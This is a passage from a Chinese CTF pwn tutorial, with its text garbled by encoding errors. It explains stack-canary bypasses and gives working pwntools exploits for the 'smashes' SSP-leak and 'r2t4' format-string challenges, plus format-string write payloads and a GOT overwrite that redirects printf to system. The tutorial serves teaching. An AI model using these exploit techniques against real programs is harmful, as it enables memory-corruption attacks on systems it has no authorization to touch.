ˆé¡¶åˆ°è¿™ä¸ªargv[0]çš„åç§»ï¼Œä»è€Œæ–¹ä¾¿æˆ‘ä»¬è®¡ç®—å‡ºéœ€è¦å¡«å……çš„å­—ç¬¦ä¸ªæ•°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/34.png" alt="image-20210403203337757"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/35.png" alt="image-20210406215300344"></p><p>ä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠæ–­ç‚¹ä¸‹åˆ°<code>_IO_gets</code>è¿™ä¸ªå‡½æ•°ä¹‹å‰å°±èƒ½è·å–åˆ°argv[0]çš„åç§»ï¼Œæ¥ç€å¯ä»¥çœ‹åˆ°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/36.png" alt="image-20210406215520252"></p><p>åœ°å€æ˜¯<strong>0x40080E</strong>ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¿™ä¸ªä½ç½®ä¸‹ä¸ªæ–­ç‚¹ï¼Œçœ‹RSPçš„å€¼å³å¯</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/37.png" alt="image-20210406220110587"></p><p>æ‰€ä»¥åç§»å€¼ä¸º<strong>0x7fffffffded8 - 0x7fffffffdcc0 = 0x218</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find CTF</span><br><span class="line">Searching for &#x27;CTF&#x27; in: None ranges</span><br><span class="line">Found <span class="number">2</span> results, display max <span class="number">2</span> items:</span><br><span class="line">smashes : <span class="number">0x400d21</span> (<span class="string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)</span><br><span class="line">smashes : <span class="number">0x600d21</span> (<span class="string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰¾åˆ°flagçš„å€¼ï¼Œä½†æ˜¯çœ‹ä¸Šæ–‡ä¸­æœ‰ä¸¤ä¸ªå€¼ï¼Œæˆ‘ä»¬ç›´æ¥æ˜¯ç”¨<strong>0x400d21</strong>è¿™ä¸ªå€¼</p><div class="note default modern"><p>æ®ç½‘ä¸Šçš„WPè¯´æ³•ï¼ŒELFçš„é‡æ˜ å°„ï¼Œå½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°çš„æ—¶å€™ï¼Œä»–çš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„ï¼Œç•™ä¸ªå‘åé¢å¡«</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_main_func_addr = <span class="number">0x7fffffffded8</span></span><br><span class="line">get_io_gets_func_addr = <span class="number">0x7fffffffdcc0</span></span><br><span class="line">flag_addr = <span class="number">0x400d21</span></span><br><span class="line">offset=get_main_func_addr - get_io_gets_func_addr</span><br><span class="line">print(<span class="string">&quot;[*] offset is :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(offset)))</span><br><span class="line">payload = (<span class="string">&quot;A&quot;</span> * offset).encode() + p64(flag_addr)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!\nWhat&#x27;s your name?&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆæˆ‘ä»¬è¾“å‡ºäº†flagçš„å€¼</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/38.png" alt="image-20210406222753429"></p><h3 id="åŠ«æŒstack-chk-failå‡½æ•°"><a href="#åŠ«æŒstack-chk-failå‡½æ•°" class="headerlink" title="åŠ«æŒstack_chk_failå‡½æ•°"></a>åŠ«æŒstack_chk_failå‡½æ•°</h3><p>ä»SSPä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥Canaryå¤±è´¥çš„å¤„ç†é€»è¾‘ä¼šè¿›å…¥åˆ° __stack_chk_failedå‡½æ•°ï¼Œ__stack_chk_failedå‡½æ•°æ˜¯ä¸€ä¸ªæ™®é€šçš„å»¶è¿Ÿç»‘å®šå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹GOTè¡¨åŠ«æŒè¿™ä¸ªå‡½æ•°ã€‚</p><h4 id="æ¼æ´å­˜åœ¨ç‚¹"><a href="#æ¼æ´å­˜åœ¨ç‚¹" class="headerlink" title="æ¼æ´å­˜åœ¨ç‚¹"></a>æ¼æ´å­˜åœ¨ç‚¹</h4><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ä¸€ç§å¾ˆå¸¸è§çš„æ¼æ´ï¼Œå…¶äº§ç”Ÿæ ¹æºæ˜¯printfå‡½æ•°è®¾è®¡çš„ç¼ºé™·ï¼Œprintfå‡½æ•°å®ƒå¹¶ä¸çŸ¥é“è‡ªå·±ç°åœ¨çš„å‚æ•°ä¸ªæ•°æœ‰å‡ ä¸ªï¼Œä½†æ˜¯å®ƒçš„å†…éƒ¨å´æœ‰ä¸ªæŒ‡é’ˆç”¨æ¥ç´¢æ£€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å¯¹äºé‡åˆ°ç‰¹å®šç±»å‹%ï¼Œå°±å»æ‰§è¡Œå–ç›¸åº”å‚æ•°çš„å€¼ï¼Œç›´åˆ°ç´¢æ£€åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“æŸã€‚å¦‚æœprintfè¯­å¥æ²¡æœ‰å¸¦æ ¼å¼åŒ–å­—ç¬¦å‚æ•°çš„è¯ï¼Œé‚£ä¹ˆå°±ä¸€å®šå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><h4 id="æ ¼å¼åŒ–å­—ç¬¦"><a href="#æ ¼å¼åŒ–å­—ç¬¦" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦"></a>æ ¼å¼åŒ–å­—ç¬¦</h4><table><thead><tr><th align="left">æ ¼å¼å­—ç¬¦</th><th align="center">æ„ä¹‰</th></tr></thead><tbody><tr><td align="left">d</td><td align="center">ä»¥åè¿›åˆ¶å½¢å¼è¾“å‡ºå¸¦ç¬¦å·æ•´æ•°(æ­£æ•°ä¸è¾“å‡ºç¬¦å·)</td></tr><tr><td align="left">o</td><td align="center">ä»¥å…«è¿›åˆ¶å½¢å¼è¾“å‡ºæ— ç¬¦å·æ•´æ•°(ä¸è¾“å‡ºå‰ç¼€0)</td></tr><tr><td align="left">x</td><td align="center">ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºæ— ç¬¦å·æ•´æ•°(ä¸è¾“å‡ºå‰ç¼€Ox)</td></tr><tr><td align="left">u</td><td align="center">ä»¥åè¿›åˆ¶å½¢å¼è¾“å‡ºæ— ç¬¦å·æ•´æ•°</td></tr><tr><td align="left">f</td><td align="center">ä»¥å°æ•°å½¢å¼è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•°</td></tr><tr><td align="left">e</td><td align="center">ä»¥æŒ‡æ•°å½¢å¼è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•°</td></tr><tr><td align="left">g</td><td align="center">ä»¥%fæˆ–%eä¸­è¾ƒçŸ­çš„è¾“å‡ºå®½åº¦è¾“å‡ºå•ã€åŒç²¾åº¦å®æ•°</td></tr><tr><td align="left">c</td><td align="center">è¾“å‡ºå•ä¸ªå­—ç¬¦</td></tr><tr><td align="left">s</td><td align="center">è¾“å‡ºå­—ç¬¦ä¸²</td></tr><tr><td align="left">p</td><td align="center">è¾“å‡ºæŒ‡é’ˆåœ°å€ï¼Œå¯ä»¥ç”¨æ¥è®¡ç®—æ ¼å¼åŒ–å­—ç¬¦çš„åç§»</td></tr><tr><td align="left">n</td><td align="center">å°†%nä¹‹å‰å·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®</td></tr></tbody></table><ul><li>%hhn å‘æŸåœ°å€å†™å…¥1å­—èŠ‚</li><li>%hn å‘æŸä¸ªåœ°å€å†™å…¥2å­—èŠ‚</li><li>%n å‘æŸä¸ªåœ°å€å†™å…¥4å­—èŠ‚</li><li>%lln å‘æŸåœ°å€å†™å…¥8å­—èŠ‚</li></ul><h4 id="æ¼æ´çš„åˆ©ç”¨æ‰‹æ®µ"><a href="#æ¼æ´çš„åˆ©ç”¨æ‰‹æ®µ" class="headerlink" title="æ¼æ´çš„åˆ©ç”¨æ‰‹æ®µ"></a>æ¼æ´çš„åˆ©ç”¨æ‰‹æ®µ</h4><ul><li><p>æç ´åï¼Œä½¿ç¨‹åºå´©æºƒã€‚</p><p>å› ä¸º%så¯¹åº”çš„å‚æ•°åœ°å€ä¸åˆæ³•çš„æ¦‚ç‡è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ã€‚æ‰€ä»¥ç›´æ¥è¾“å…¥æ— æ•°ä¸ª%sè®©å…¶é‡åˆ°ä¸åˆæ³•åœ°å€ç„¶åå´©æºƒã€‚</p></li><li><p>æ³„éœ²å†…å­˜</p><p>æ³„éœ²æ ˆå†…å®¹ï¼šè·å–æŸä¸ªå˜é‡çš„å€¼ï¼›è·å–æŸä¸ªå˜é‡å¯¹åº”åœ°å€çš„å†…å­˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32bitï¼š   %n$x : è¿”å›æ ˆä¸Šç¬¬ï¼ˆn+1ï¼‰ä¸ªå‚æ•°çš„å€¼</span><br><span class="line">64bitï¼š   %n$p æˆ–è€… %n$llx (64bit) ï¼šè¿”å›æ ˆä¸Šç¬¬ï¼ˆn-5ï¼‰ä¸ªå‚æ•°çš„å€¼</span><br></pre></td></tr></table></figure><p>æ³„éœ²ä»»æ„åœ°å€å†…å­˜ï¼šåˆ©ç”¨gotè¡¨å¾—åˆ°libcå‡½æ•°åœ°å€ï¼Œè¿›è€Œè·å–å…¶ä»–libcå‡½æ•°åœ°å€ï¼›ç›²ç›®åœ°dumpæ•´ä¸ªç¨‹åºï¼Œè·å–æœ‰ç”¨ä¿¡æ¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32bitï¼š   %n$sï¼šæŠŠæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œè¿”å›è¯¥åœ°å€å†…å­˜çš„å€¼</span><br><span class="line">64bitï¼š   %n$sï¼šæŠŠæ ˆä¸Šç¬¬n-5ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œè¿”å›è¯¥åœ°å€å†…å­˜çš„å€¼</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹å†…å­˜æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%***c%n$nï¼š  æŠŠæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œå°†è¯¥åœ°å€çš„é«˜32bitå€¼æ”¹ä¸º hex(***)</span><br><span class="line">%***c%n$hnï¼š æŠŠæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œå°†è¯¥åœ°å€çš„é«˜16bitå€¼æ”¹ä¸º hex(***)</span><br><span class="line">%***c%n$hhnï¼šæŠŠæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œå°†è¯¥åœ°å€çš„é«˜8bitå€¼æ”¹ä¸º hex(***)</span><br><span class="line">[64bitä¸‹ï¼Œï¼ˆn+1ï¼‰å˜ä¸ºï¼ˆn-5ï¼‰å³å¯ ]</span><br></pre></td></tr></table></figure></li></ul><h4 id="æ§åˆ¶ç¬¦-n-çš„åˆ©ç”¨"><a href="#æ§åˆ¶ç¬¦-n-çš„åˆ©ç”¨" class="headerlink" title="æ§åˆ¶ç¬¦ %n çš„åˆ©ç”¨"></a>æ§åˆ¶ç¬¦ %n çš„åˆ©ç”¨</h4><p>åœ¨æ ¼å¼åŒ–æ§åˆ¶ç¬¦ä¸­æœ‰ä¸€ä¸ª %n ï¼Œå®ƒç”¨äºæŠŠå½“å‰è¾“å‡ºçš„æ‰€æœ‰æ•°æ®çš„é•¿åº¦å†™å›ä¸€ä¸ªå˜é‡ä¸­å»ã€‚</p><p>ç”±äºå¯èƒ½ä¼šé€ æˆæº¢å‡ºæ¼æ´ä»è€Œè¿›ç¨‹è¢«æ¶æ„ä»£ç åŠ«æŒï¼Œç°å¦‚ä»Šè¯¥æ§åˆ¶ç¬¦è²Œä¼¼å¾ˆæ—©ä¹‹å‰å°±è¢«å¼ƒç”¨äº†ã€‚<br>ç°åœ¨åªæœ‰åœ¨ vc 6.0++ å’Œ linux ä¸Šè¿˜å¯ä»¥ç”¨ã€‚</p><p>ä¸¾ä¸€ä¸ªæ —å­ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%n\n&quot;</span>,&amp;length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,length);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å‡ºï¼š</span></span><br><span class="line"><span class="comment">//hello</span></span><br><span class="line"><span class="comment">//5</span></span><br></pre></td></tr></table></figure><p>è¯¥ç¨‹åºé¦–å…ˆä¼šè¾“å‡º hello ï¼Œç„¶åæŠŠå­—ç¬¦ä¸²é•¿åº¦5å­˜å› &amp;lengthå˜é‡é‡Œï¼Œç¬¬äºŒæ¬¡è¾“å‡ºlengthå˜é‡çš„å€¼å³æ˜¯5ã€‚</p><h5 id="ä»»æ„åœ°å€å†™-32ä½"><a href="#ä»»æ„åœ°å€å†™-32ä½" class="headerlink" title="ä»»æ„åœ°å€å†™(32ä½)"></a>ä»»æ„åœ°å€å†™(32ä½)</h5><p>32ä½çš„åœ°å€åœ¨å‰é¢ï¼Œ64ä½çš„åœ°å€åœ¨åé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(system_addr)+ <span class="string">&#x27;%012c&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>ä¸¾ä¸ªæ —å­æ–¹ä¾¿ç†è§£</p><p>æ¯”å¦‚payloadä¸º <code>\x8c\x97\x04\x08%2048c%5$n</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠ<strong>0x0804978c</strong>åœ°å€é‡Œçš„å†…å®¹ä¿®æ”¹ä¸º**0x804 **ï¼ˆ2048+4å­—èŠ‚ï¼‰</p></li><li><p>å†ä¸¾ä¸ªæ —å­</p><p>ä¾‹å¦‚è¦æŠŠprintfçš„åœ°å€ ä¿®æ”¹ä¸º systemåœ°å€ã€‚æˆ‘ä»¬é‡‡å–å•å­—èŠ‚çš„ä¿®æ”¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf_got=<span class="number">0x08049778</span>  </span><br><span class="line">system_plt=<span class="number">0x08048320</span></span><br><span class="line">payload=p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)+p32(printf_got+<span class="number">3</span>)</span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x20</span>-<span class="number">16</span>)+<span class="string">&quot;c%5$hhn&quot;</span>  </span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x83</span>-<span class="number">0x20</span>)+<span class="string">&quot;c%6$hhn&quot;</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x104</span>-<span class="number">0x83</span>)+<span class="string">&quot;c%7$hhn&quot;</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x08</span>-<span class="number">0x04</span>)+<span class="string">&quot;c%8$hhn&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="ä»»æ„åœ°å€å†™-64ä½"><a href="#ä»»æ„åœ°å€å†™-64ä½" class="headerlink" title="ä»»æ„åœ°å€å†™(64ä½)"></a>ä»»æ„åœ°å€å†™(64ä½)</h5><p>ä¸‹é¢é¢˜ç›®çš„EXPï¼Œæˆ‘ä»¬é‡‡å–2å­—èŠ‚çš„ä¿®æ”¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span> + p64(stack_chk_fail+<span class="number">2</span>) + p64(stack_chk_fail)</span><br></pre></td></tr></table></figure><p>å…·ä½“è§£é‡Šçœ‹é¢˜è§£å†…å®¹å³å¯</p><h4 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p><a href="http://www.int0x80.top/BypassCanary/r2t4">é¢˜ç›®åœ°å€</a>    <a href="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/r2t4">å¤‡ç”¨åœ°å€</a></p><p>ä»IDAä¸­å¯ä»¥çœ‹åˆ°mainå‡½æ•°æœ‰Canaryä¿æŠ¤</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/39.png" alt="image-20210409000213211"></p><p>å¹¶ä¸”å‡½æ•°ä¸­æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨åé—¨å‡½æ•°backdoor</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸‹æ ¼å¼åŒ–å­—ç¬¦çš„åç§»ï¼Œè¿è¡Œç¨‹åºè¾“å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¾“å‡ºå†…å®¹ï¼Œæˆ‘ä»¬çš„41414141åœ¨ç¬¬å…­ä¸ªå‚æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ./r2t4 </span><br><span class="line">AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">AAAA0x7ffeaa5d0250<span class="number">.0</span>x38<span class="number">.0</span>x7fa6a53fe320<span class="number">.0</span>x400730<span class="number">.0</span>x7fa6a56e1af0<span class="number">.0</span>x252e702541414141<span class="number">.0</span>x2e70252e70252e70<span class="number">.0</span>x70252e70252e7025<span class="number">.0</span>x252e70252e70252e<span class="number">.0</span>x2e70252e70252e70<span class="number">.0</span>x87ab0a70252e7025<span class="number">.0</span>x4006c0<span class="number">.0</span>x7fa6a5327840<span class="number">.0</span>x1</span><br><span class="line">*** <span class="built_in">stack</span> smashing detected ***: ./r2t4 terminated</span><br><span class="line">ï¿½ï¿½ï¿½@Aborted (core dumped)</span><br></pre></td></tr></table></figure><p>æ¥ç€ä»IDAä¸­æ‰¾åˆ°åé—¨å‡½æ•°çš„åœ°å€ï¼Œå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function name| Segment |      Start      | Length  |</span><br><span class="line">  backdoor     .text  0000000000400626  00000038</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥å†™EXPäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./r2t4&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./r2t4&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system=<span class="number">0x400626</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail is :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(__stack_chk_fail)))</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail high is :&quot;</span>+<span class="built_in">str</span>(p64(__stack_chk_fail+<span class="number">2</span>)))</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail low is :&quot;</span>+<span class="built_in">str</span>(p64(__stack_chk_fail)))</span><br><span class="line">payload=<span class="string">b&#x27;%64c%9$hn%1510c%10$hnAAA&#x27;</span> + p64(__stack_chk_fail+<span class="number">2</span>) + p64(__stack_chk_fail)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>backdoorçš„åœ°å€æ˜¯0x400626ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æŠŠ __stack_chk_fail çš„åœ°å€è¦†ç›–æ‰<br><code>%64c</code>ï¼š0x40ï¼Œæ›¿æ¢backdoorçš„ä¸¤ä½é«˜å­—èŠ‚0x0040<br><code>%64c%9$hn%1510c%10$hnAAA</code>ï¼šå 24ä¸ªå­—ç¬¦ï¼Œ24/8=3ï¼Œåç§»ä¸º6+3=9ï¼ˆä¹‹å‰ç®—å‡ºçš„ç¬¬å…­ä¸ªå‚æ•°ä¸­ï¼‰<br><code>$hn</code>ï¼šå‘æŸä¸ªåœ°å€å†™å…¥åŒå­—èŠ‚<br><code>%1510c</code>ï¼š1510+64=0x0626,æ›¿æ¢backdoorçš„ä¸¤ä½é«˜å­—èŠ‚0x0626<br><code>AAA</code>ï¼šæ˜¯å¡«å……å­—ç¬¦ï¼Œå¡«å……åˆ°8çš„å€æ•°<br><code>__stack_chk_fail+2</code>å’Œ<code>__stack_chk_fail</code>åˆ†åˆ«æ›¿æ¢æˆbackdoorçš„é«˜ä¸¤ä½å­—èŠ‚å’Œä½ä¸¤ä½å­—èŠ‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/40.png" alt="image-20210409035655552"></p><p>è¾“å‡ºäº†æˆ‘ä»¬ä¹‹å‰åšé¢˜å†™çš„flagæ–‡ä»¶å†…å®¹</p><h3 id="è¦†ç›–-TLS-ä¸­å‚¨å­˜çš„-Canary-å€¼"><a href="#è¦†ç›–-TLS-ä¸­å‚¨å­˜çš„-Canary-å€¼" class="headerlink" title="è¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼"></a>è¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼</h3><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h4><p>é€šå¸¸åœ¨Cç¨‹åºä¸­å¸¸å­˜åœ¨å…¨å±€å˜é‡ã€é™æ€å˜é‡ä»¥åŠå±€éƒ¨å˜é‡ï¼Œå¯¹äºå±€éƒ¨å˜é‡æ¥è¯´ï¼Œå¹¶ä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚è€Œå¯¹äºå…¨å±€å˜é‡å’Œå‡½æ•°å†…å®šä¹‰çš„é™æ€å˜é‡ï¼ŒåŒä¸€è¿›ç¨‹ä¸­å„ä¸ªçº¿ç¨‹éƒ½å¯ä»¥è®¿é—®å®ƒä»¬ï¼Œå› æ­¤å®ƒä»¬å­˜åœ¨å¤šçº¿ç¨‹è¯»å†™é—®é¢˜ã€‚</p><p>å¦‚æœéœ€è¦åœ¨ä¸€ä¸ªçº¿ç¨‹å†…éƒ¨çš„å„ä¸ªå‡½æ•°è°ƒç”¨éƒ½èƒ½è®¿é—®ã€ä½†å…¶å®ƒçº¿ç¨‹ä¸èƒ½è®¿é—®çš„å˜é‡ï¼ˆè¢«ç§°ä¸ºstatic memory local to a thread çº¿ç¨‹å±€éƒ¨é™æ€å˜é‡ï¼‰ï¼Œå°±éœ€è¦æ–°çš„æœºåˆ¶æ¥å®ç°ï¼Œè¿™å°±æ˜¯TLSã€‚å½“å‡½æ•°åœ¨ä¸åŒçš„çº¿ç¨‹ä¸Šè¢«è°ƒç”¨æ—¶ï¼Œè¯¥çº¿ç¨‹ä¼šè¢«åˆ†é…æ–°çš„æ 